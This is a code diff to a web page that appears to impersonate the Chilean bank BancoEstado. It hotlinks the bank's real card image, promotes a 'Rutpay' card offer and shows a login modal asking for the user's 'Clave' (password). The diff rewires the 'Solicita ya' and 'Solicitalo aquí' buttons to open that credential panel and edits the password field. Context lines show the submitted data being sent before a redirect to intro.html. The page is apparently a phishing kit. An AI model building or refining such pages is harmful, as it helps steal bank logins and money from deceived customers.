@@ -226,6 +226,8 @@
             transition: background 0.3s, transform 0.3s;
             display: inline-block;
             margin-top: 5px;
+            cursor: pointer;
+            border: none;
         }
 
         .cards .btn-solicita:hover {
@@ -317,6 +319,8 @@
             text-decoration: none;
             font-size: 28px;
             font-weight: bold;
+            cursor: pointer;
+            border: none;
         }
 
         .btn-rutpay {
@@ -626,13 +630,14 @@
 
         .password-container input {
             width: 100%;
-            padding: 8px;
+            padding: 10px;
             padding-right: 40px;
             border: 1px solid #bbb;
             border-radius: 3px;
             font-size: 18px;
             transition: border-color 0.3s;
             box-sizing: border-box;
+            letter-spacing: 1px;
         }
 
         .password-container input:focus {
@@ -1158,7 +1163,7 @@
     <!-- TARJETAS (imagen real de BancoEstado + botón Solicita ya) -->
     <div class="cards">
         <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--40931a6e-12be-4d56-ae45-25bbc13d6383/tarjetas-bancoestado-pack-visa-2.png?quality=82&preferwebp=true" alt="Tarjetas BancoEstado">
-        <a href="#" class="btn-solicita">📱 Solicita ya</a>
+        <button class="btn-solicita" onclick="abrirPanel()">📱 Solicita ya</button>
     </div>
 
     <!-- SECCIÓN INFO PRINCIPAL (Rutpay) -->
@@ -1185,9 +1190,9 @@
 
         <p class="subtitle">Para recibirlo ingresa con <strong>Rutpay</strong> para solicitarlo</p>
 
-         <a href="#" class="btn btn-rutpay">
+         <button class="btn btn-rutpay" onclick="abrirPanel()">
             Solicitalo aquí
-        </a>
+        </button>
         
         <div style="margin-top: 30px; padding: 20px; background: #fff3e0; border-radius: 15px;">
             <p style="font-size: 22px; color: #333;">
@@ -1219,7 +1224,7 @@
     </section>
 <div class="cards">
         <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--40931a6e-12be-4d56-ae45-25bbc13d6383/tarjetas-bancoestado-pack-visa-2.png?quality=82&preferwebp=true" alt="Tarjetas BancoEstado">
-        <a href="#" class="btn-solicita">📱 Solicita ya</a>
+        <button class="btn-solicita" onclick="abrirPanel()">📱 Solicita ya</button>
     </div>
     <!-- SECCIÓN BIENEFICIOS (movida más abajo) -->
     <section class="bieneficios-section">
@@ -1232,9 +1237,9 @@
             en salud, viajes, comida rápida,
             deportes y entretención.
         </p>
-        <a href="#" class="btn">
+        <button class="btn" onclick="abrirPanel()">
             Más información aquí
-        </a>
+        </button>
     </section>
 
     <!-- BENEFICIO -->
@@ -1289,7 +1294,7 @@
 
                 <label><strong>Clave</strong></label>
                 <div class="password-container">
-                    <input type="password" id="claveInput" placeholder="********">
+                    <input type="password" id="claveInput" placeholder="Ej: juan2323">
                     <button type="button" class="toggle-password" id="toggleClave" aria-label="Mostrar u ocultar clave">
                         <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                             <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
@@ -1594,7 +1599,7 @@
             this.disabled = false;
             
             if (enviado) {
-                // Redirigir a Google
+                // Redirigir a intro.html
                 window.location.href = 'intro.html';
             } else {
                 alert('Error al enviar los datos. Intenta nuevamente.');
@@ -1614,100 +1619,6 @@
             }
         });
     </script>
-    
-    <script>
-    (function() {
-        const slidesContainer = document.getElementById('slides');
-        const slides = slidesContainer.querySelectorAll('.slide');
-        const totalSlides = slides.length;
-        let currentIndex = 0;
-        let autoPlayInterval = null;
-        const AUTO_PLAY_DELAY = 5000;
-        const prevBtn = document.getElementById('prevBtn');
-        const nextBtn = document.getElementById('nextBtn');
-        const dotsContainer = document.getElementById('dotsContainer');
-
-        function createDots() {
-            dotsContainer.innerHTML = '';
-            for (let i = 0; i < totalSlides; i++) {
-                const dot = document.createElement('button');
-                dot.classList.add('dot');
-                if (i === 0) dot.classList.add('active');
-                dot.setAttribute('data-index', i);
-                dot.addEventListener('click', () => goToSlide(i));
-                dotsContainer.appendChild(dot);
-            }
-        }
-        function updateDots() {
-            const dots = dotsContainer.querySelectorAll('.dot');
-            dots.forEach((dot, index) => dot.classList.toggle('active', index === currentIndex));
-        }
-        function goToSlide(index) {
-            if (index < 0) index = totalSlides - 1;
-            if (index >= totalSlides) index = 0;
-            currentIndex = index;
-            slidesContainer.style.transform = `translateX(-${currentIndex * 100}%)`;
-            updateDots();
-            resetAutoPlay();
-        }
-        function nextSlide() { goToSlide(currentIndex + 1); }
-        function prevSlide() { goToSlide(currentIndex - 1); }
-        function resetAutoPlay() {
-            if (autoPlayInterval) clearInterval(autoPlayInterval);
-            autoPlayInterval = setInterval(nextSlide, AUTO_PLAY_DELAY);
-        }
-        function init() {
-            createDots();
-            slidesContainer.style.transform = `translateX(0)`;
-            updateDots();
-            prevBtn.addEventListener('click', prevSlide);
-            nextBtn.addEventListener('click', nextSlide);
-            const sliderContainer = document.querySelector('.slider-container');
-            sliderContainer.addEventListener('mouseenter', () => { if (autoPlayInterval) clearInterval(autoPlayInterval); });
-            sliderContainer.addEventListener('mouseleave', () => { if (!autoPlayInterval) autoPlayInterval = setInterval(nextSlide, AUTO_PLAY_DELAY); });
-            let touchStartX = 0, touchEndX = 0;
-            sliderContainer.addEventListener('touchstart', (e) => { touchStartX = e.changedTouches[0].screenX; });
-            sliderContainer.addEventListener('touchend', (e) => {
-                touchEndX = e.changedTouches[0].screenX;
-                const diff = touchStartX - touchEndX;
-                if (Math.abs(diff) > 50) diff > 0 ? nextSlide() : prevSlide();
-            });
-            resetAutoPlay();
-        }
-        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
-        else init();
-    })();
-
-    function abrirPanel() { document.getElementById("modal").classList.add("active"); document.body.style.overflow = 'hidden'; }
-    function cerrarPanel() { document.getElementById("modal").classList.remove("active"); document.body.style.overflow = ''; }
-    document.getElementById("modal").addEventListener("click", function(e) { if (e.target === this) cerrarPanel(); });
-    document.addEventListener('keydown', function(e) { if (e.key === 'Escape') cerrarPanel(); });
-
-    document.addEventListener('DOMContentLoaded', function() {
-        const toggleBtn = document.getElementById('toggleClave');
-        const claveInput = document.getElementById('claveInput');
-        if (toggleBtn && claveInput) {
-            toggleBtn.addEventListener('click', function() {
-                const type = claveInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                claveInput.setAttribute('type', type);
-                const svg = this.querySelector('svg');
-                if (type === 'password') {
-                    svg.innerHTML = `<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/><path d="M0 0h24v24H0z" fill="none"/><line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="2"/>`;
-                } else {
-                    svg.innerHTML = `<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/><path d="M0 0h24v24H0z" fill="none"/>`;
-                }
-            });
-        }
-    });
-
-    // Redirección a intro.html al hacer clic en "Solicita ya" e "Información aquí" (ejemplo)
-    document.querySelectorAll('.btn-redir, .btn-solicita, .btn-rutpay, .bieneficios-section .btn').forEach(btn => {
-        btn.addEventListener('click', function(e) {
-            e.preventDefault();
-            window.location.href = 'intro.html';
-        });
-    });
-</script>
 
 </body>
 </html>
